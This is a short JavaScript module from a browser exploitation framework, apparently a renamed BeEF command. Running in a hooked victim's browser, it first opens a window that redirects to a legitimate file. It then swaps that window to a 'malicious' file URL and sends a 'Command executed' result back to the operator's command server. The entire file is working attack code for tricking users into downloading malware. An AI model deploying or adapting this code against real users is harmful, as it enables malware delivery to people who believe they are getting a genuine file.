//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {	
	var maliciousurl = '<%= @malicious_file_uri %>';
	var realurl = '<%= @real_file_uri %>';	
	var w;
	var once = '<%= @do_once %>';

	function doit() {

		if (!server.browser.isIE()) {
			w = window.open('data:text/html,<meta http-equiv="refresh" content="0;URL=' + realurl + '">', 'foo');
			setTimeout(donext, 4500);
		}

	}
	function donext() {
		window.open(maliciousurl, 'foo');
		if (once != true) setTimeout(donext, 5000);
		once = true;
	}
	doit();
	server.net.send("<%= @command_url %>", <%= @command_id %>, "result=Command executed");
});
